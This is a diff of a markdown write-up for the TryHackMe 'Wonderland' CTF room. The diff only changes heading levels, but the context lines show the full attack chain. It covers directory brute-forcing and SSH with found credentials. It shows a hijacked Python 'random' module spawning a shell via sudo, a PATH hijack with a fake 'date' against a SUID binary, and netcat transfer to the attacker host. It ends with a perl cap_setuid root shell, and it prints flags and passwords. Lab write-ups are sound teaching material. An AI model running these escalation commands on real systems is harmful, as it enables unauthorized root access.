@@ -6,7 +6,7 @@
 
 <div align="center"> <img alt="Difficulty: Medium" src="https://img.shields.io/badge/Difficulty-Medium-yellow" /> <img alt="OS: Linux" src="https://img.shields.io/badge/OS-Linux-blue" /> </div>
 
-### Answer the questions below
+#### Answer the questions below
 
 
 Ques 1. Obtain the flag in user.txt
@@ -20,8 +20,8 @@ thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
 ```
 
 
-# 1. Let's Get Started 
-### Let make a Nmap Scan
+## 1. Let's Get Started 
+#### Let make a Nmap Scan
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/wonder]
 └─$ nmap 10.10.159.138 -sV -sC                 
@@ -39,8 +39,8 @@ PORT   STATE SERVICE VERSION
 |_http-title: Follow the white rabbit.
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-# 2. As Http is open let make a dirctory search
-### Im using ```dirsearch``` bez it easy to use
+## 2. As Http is open let make a dirctory search
+#### Im using ```dirsearch``` bez it easy to use
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/wonder]
 └─$ dirsearch -u 10.10.159.138                     
@@ -111,12 +111,12 @@ Target: http://10.10.159.138/
 
 Task Completed
 ```
-### Got a lot of page but let visite ip first
+#### Got a lot of page but let visite ip first
 ![Screenshot from 2024-04-05 21-38-29](https://github.com/Esther7171/Wonderland/assets/122229257/6f966ffa-66e2-4efc-a8b0-39a1d30fb78e)
-#### I manually check admin and index but nothing i got let check  /r  it look intreasting
-#### Ohh i got something
+##### I manually check admin and index but nothing i got let check  /r  it look intreasting
+##### Ohh i got something
 ![Screenshot from 2024-04-05 22-36-52](https://github.com/Esther7171/Wonderland/assets/122229257/e22cb34f-05bb-4c4a-8a3f-353d5fefaa2b)
-## So let make again dirSearch
+### So let make again dirSearch
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/wonder]
 └─$ dirsearch -u 10.10.159.138/r
@@ -186,12 +186,12 @@ Target: http://10.10.159.138/
 
 Task Completed
 ```
-## Got /a
+### Got /a
 ![Screenshot from 2024-04-05 22-45-26](https://github.com/Esther7171/Wonderland/assets/122229257/b9931dbb-462e-4eec-86a9-ceed2171a3cc)
 
 
-### Again so many but specific one is /a
-### Let make again dirSearch at /a
+#### Again so many but specific one is /a
+#### Let make again dirSearch at /a
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/wonder]
 └─$ dirsearch -u 10.10.159.138/r/a
@@ -255,19 +255,19 @@ CTRL+C detected: Pausing threads, please wait...
 
 Canceled by the user
 ```
-### Ok so i got /b so i dont need to dig more 
+#### Ok so i got /b so i dont need to dig more 
 ![hhhhh3](https://github.com/Esther7171/Wonderland/assets/122229257/c6decf71-4df4-4249-b1f2-cffb84aad06f)
-### So Things making sence ```rabbit``` let try Directly  http://10.10.159.138/r/a/b/b/i/t/
+#### So Things making sence ```rabbit``` let try Directly  http://10.10.159.138/r/a/b/b/i/t/
 ![Screenshot from 2024-04-05 22-50-26](https://github.com/Esther7171/Wonderland/assets/122229257/f69b31d8-f468-470d-8e94-b559cc1ac080)
-### Let check code
+#### Let check code
 ![Screenshot from 2024-04-05 22-54-12](https://github.com/Esther7171/Wonderland/assets/122229257/8dad040d-8815-43ab-a15d-ca723ee4b38c)
 
-# 3. SSH Time
-### We got username alice and password
+## 3. SSH Time
+#### We got username alice and password
 ```bash
 alice:HowDothTheLittleCrocodileImproveHisShiningTail
 ```
-## Let enter !!
+### Let enter !!
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/wonder]
 └─$ ssh alice@10.10.159.138
@@ -298,7 +298,7 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
 alice@wonderland:~$ 
 ```
-## Ok let manually enumerate
+### Ok let manually enumerate
 ```bash
 
 alice@wonderland:~$ ls -la
@@ -319,11 +319,11 @@ alice@wonderland:/home$ ls
 alice  hatter  rabbit  tryhackme
 alice@wonderland:/home$
 ```
-### So we got some user and a python file
-### Let see content of python file
+#### So we got some user and a python file
+#### Let see content of python file
 
 
-## As i remember There is a hint for user.txt in the Wonderland room ```Everything is upside down here``` as root.txt in alice so maybe user.txt is in root
+### As i remember There is a hint for user.txt in the Wonderland room ```Everything is upside down here``` as root.txt in alice so maybe user.txt is in root
 ```bash
 alice@wonderland:/home$ cd /
 alice@wonderland:/$ ls
@@ -338,13 +338,13 @@ alice@wonderland:/root$ ls
 ls: cannot open directory '.': Permission denied
 alice@wonderland:/root$
 ```
-### So try directly , Ohh we got flag !! 
+#### So try directly , Ohh we got flag !! 
 ```bash
 alice@wonderland:/home$ cat /root/user.txt
 thm{"Curiouser and curiouser!"}
 alice@wonderland:/home$ 
 ```
-# 4. Try to find more clues to Privilege Escalation
+## 4. Try to find more clues to Privilege Escalation
 ```bash
 alice@wonderland:/root$ sudo -l
 [sudo] password for alice: 
@@ -357,7 +357,7 @@ User alice may run the following commands on wonderland:
     (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 alice@wonderland:/root$ 
 ```
-## So Let see content of python file
+### So Let see content of python file
 ```bash
 alice@wonderland:/home$ cd alice
 alice@wonderland:~$ cat walrus_and_the_carpenter.py 
@@ -502,7 +502,7 @@ alice@wonderland:~$ python3 -c 'import sys; print (sys.path)'
 ['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
 alice@wonderland:~$
 ```
-#### Ok We have python library , but let check if there is any cron job
+##### Ok We have python library , but let check if there is any cron job
 ```bash
   alice@wonderland:~$ crontab -l
 no crontab for alice
@@ -512,17 +512,17 @@ alice@wonderland:~$ ps
  1388 pts/0    00:00:00 ps
 alice@wonderland:~$ 
 ```
-### Na
-## So Let check sudor.d file
+#### Na
+### So Let check sudor.d file
 ```bash
 alice@wonderland:~$ cat /etc/sudoers.d/alice 
 alice ALL = (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 alice@wonderland:~$ 
 ```
-## So Rabbit have permission to run python file
-## Ok so let make a fake python random module with same name to fill it with malicious code and run 
-# 5. Access rabbit using Python script
-### I'm Writing a testing program just for try
+### So Rabbit have permission to run python file
+### Ok so let make a fake python random module with same name to fill it with malicious code and run 
+## 5. Access rabbit using Python script
+#### I'm Writing a testing program just for try
 ```bash
 alice@wonderland:~$ echo ""import os"
 > os.system("/bin/bash")" > random.py
@@ -531,7 +531,7 @@ import os
 os.system("/bin/bash")
 alice@wonderland:~$ 
 ```
-## Let try to run probably it will run as i think of !!
+### Let try to run probably it will run as i think of !!
 ```bash
 alice@wonderland:~$ sudo -l
 Matching Defaults entries for alice on wonderland:
@@ -542,8 +542,8 @@ User alice may run the following commands on wonderland:
 alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 rabbit@wonderland:~$ 
 ```
-## wow I got this 
-### So let manually enum this
+### wow I got this 
+#### So let manually enum this
 ```bash
 rabbit@wonderland:~$ pwd
 /home/alice
@@ -559,8 +559,8 @@ lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
 -rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
 rabbit@wonderland:/home/rabbit$ 
 ```
-### I found something suspicious ```teaParty``` is in red colour
-## Ok try to execute and read content but it not doing anything.
+#### I found something suspicious ```teaParty``` is in red colour
+### Ok try to execute and read content but it not doing anything.
 ```bash
 rabbit@wonderland:/home/rabbit$ ./teaParty 
 Welcome to the tea party!
@@ -577,7 +577,7 @@ Press Enter to continue
 
 rabbit@wonderland:/home/rabbit$ 
 ```
-### Let ltrace it
+#### Let ltrace it
 ```bash
 rabbit@wonderland:/home/rabbit$ ltrace ./teaParty 
 setuid(1003)                                                                                                                                       = -1
@@ -598,8 +598,8 @@ puts("Segmentation fault (core dumped)"...Segmentation fault (core dumped)
 +++ exited (status 33) +++
 rabbit@wonderland:/home/rabbit$
 ``` 
-## OK it's made up fault of segmentation 
-### Let check strings 
+### OK it's made up fault of segmentation 
+#### Let check strings 
 ```bash
 rabbit@wonderland:/home/rabbit$ strings teaParty 
 
@@ -611,26 +611,26 @@ Please ask your administrator.
 rabbit@wonderland:/home/rabbit$
 ```
 
-### ohh i can't do it in rabit, let transfer it to my system using netcat
-#### Open listener and direct content to a txt file
+#### ohh i can't do it in rabit, let transfer it to my system using netcat
+##### Open listener and direct content to a txt file
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/wonder]
 └─$ nc -lvnp 4444 > teaparty
 listening on [any] 4444 ...
 ```
-### In rabbit Transfer teaParty file
+#### In rabbit Transfer teaParty file
 ```bash
 rabbit@wonderland:/home/rabbit$ nc 10.17.120.99 4444 < teaParty
 c^C
 ```
-### Suspend connection 
+#### Suspend connection 
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/wonder]
 └─$ nc -lvnp 4444 > teaparty
 listening on [any] 4444 ...
 connect to [10.17.120.99] from (UNKNOWN) [10.10.159.138] 59842
 ```
-### Let check strings
+#### Let check strings
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/wonder]
 └─$ strings teaparty
@@ -718,14 +718,14 @@ __cxa_finalize@@GLIBC_2.2.5
 .bss
 .comment
 ```
-# 6. Let Try to modify date
-## As i think date have directly so try to modify it
-### Let check path 
+## 6. Let Try to modify date
+### As i think date have directly so try to modify it
+#### Let check path 
 ```bash
 echo "$PATH"
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
 ```
-## Ok let try to make a file with date
+### Ok let try to make a file with date
 ```bash
 rabbit@wonderland:/home/rabbit$ nano date 
 Unable to create directory /home/alice/.local/share/nano/: Permission denied
@@ -733,36 +733,36 @@ It is required for saving/loading search history or cursor positions.
 
 Press Enter to continue
 ```
-## Add few lines to get new bash session
+### Add few lines to get new bash session
 ![Screenshot from 2024-04-06 00-51-54](https://github.com/Esther7171/Wonderland/assets/122229257/52bce8df-8de2-4e83-a6ee-f224f7d1ff87)
 
-## Let give permission and run this
+### Let give permission and run this
 ```bash
 rabbit@wonderland:/home/rabbit$ chmod +x date 
 rabbit@wonderland:/home/rabbit$ ./date
 rabbit@wonderland:/home/rabbit$ 
 ```
-## Let check the shell level to get an idea of success
+### Let check the shell level to get an idea of success
 ```bash
 rabbit@wonderland:/home/rabbit$ echo "$SHLVL"
 3
 rabbit@wonderland:/home/rabbit$ 
 ```
-### okay we got differ session 
-# 7. Let add this to path
+#### okay we got differ session 
+## 7. Let add this to path
 ```bash
 rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
 rabbit@wonderland:/home/rabbit$ 
 ```
-## It is gonna use prefex of that binary so We successfully make a fake date command that give use other user , before reaching to real date command
-### Let run teaParty again
+### It is gonna use prefex of that binary so We successfully make a fake date command that give use other user , before reaching to real date command
+#### Let run teaParty again
 ```bash
 rabbit@wonderland:/home/rabbit$ ./teaParty 
 Welcome to the tea party!
 The Mad Hatter will be here soon.
 Probably by hatter@wonderland:/home/rabbit$ 
 ````
-## Ok i got hatter 
+### Ok i got hatter 
 ```bash
 Probably by hatter@wonderland:/home/rabbit$ cd /home/hatter/
 hatter@wonderland:/home/hatter$ ls -la
@@ -777,7 +777,7 @@ drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
 -rw------- 1 hatter hatter   29 May 25  2020 password.txt
 hatter@wonderland:/home/hatter$ 
 ```
-### I got a file password.txt maybe it for hatter 
+#### I got a file password.txt maybe it for hatter 
 ```bash
 hatter@wonderland:/home/hatter$ cat password.txt 
 WhyIsARavenLikeAWritingDesk?
@@ -788,29 +788,29 @@ hatter@wonderland:~$ whoami
 hatter
 hatter@wonderland:~$ 
 ```
-# I dont think it make any difference
-## Let find suid file
+## I dont think it make any difference
+### Let find suid file
 ```bash
 find / -user root -perm /4000 2>/dev/null
 ```
-### I dont get any useful files
-## Let try again
+#### I dont get any useful files
+### Let try again
 ```bash
 getcap -r / 2>/dev/null
 ```
-# I got perl Capabilities here with suid 
+## I got perl Capabilities here with suid 
 ```bash
 alice@wonderland:~$ getcap -r / 2>/dev/null 
 /usr/bin/perl5.26.1 = cap_setuid+ep
 /usr/bin/mtr-packet = cap_net_raw+ep
 /usr/bin/perl = cap_setuid+ep
 ```
-# 8. Let Get Root 
-### Let search on gtfobin for perl Capabilities
+## 8. Let Get Root 
+#### Let search on gtfobin for perl Capabilities
 ![Screenshot from 2024-04-06 01-43-55](https://github.com/Esther7171/Wonderland/assets/122229257/cfe08d6f-8449-4d22-9aa6-5a2602edfffb)
 
-### So let run this 
-## I just modify last line of sh to bash ```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'```
+#### So let run this 
+### I just modify last line of sh to bash ```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'```
 ```bash
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
 ```
@@ -820,7 +820,7 @@ hatter
 hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
 root@wonderland:~# 
 ```
-## Boom !! 
+### Boom !! 
 ```bash
 root@wonderland:~# ls
 linpeas.sh.save  password.txt
@@ -829,4 +829,4 @@ root@wonderland:/home/alice# cat root.txt
 thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
 root@wonderland:/home/alice# 
 ```
-# 😄
+## 😄
